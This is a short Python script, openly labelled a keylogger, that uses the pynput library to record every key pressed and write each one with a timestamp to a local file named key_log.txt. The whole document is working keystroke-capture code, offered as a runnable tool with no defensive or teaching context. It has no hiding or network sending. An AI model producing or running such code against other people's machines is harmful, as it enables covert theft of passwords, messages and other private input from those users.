from pynput.keyboard import Listener
import logging

# Set up logging to save keystrokes to a file
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function that gets called on each key press
def on_press(key):
    try:
        logging.info(str(key))  # Log the key pressed
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Main function to start the keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()  # Join the listener thread so it runs in the background

# Start the keylogger
if __name__ == "__main__":
    print("Starting the keylogger... (Make sure you have the necessary permissions)")
    start_keylogger()
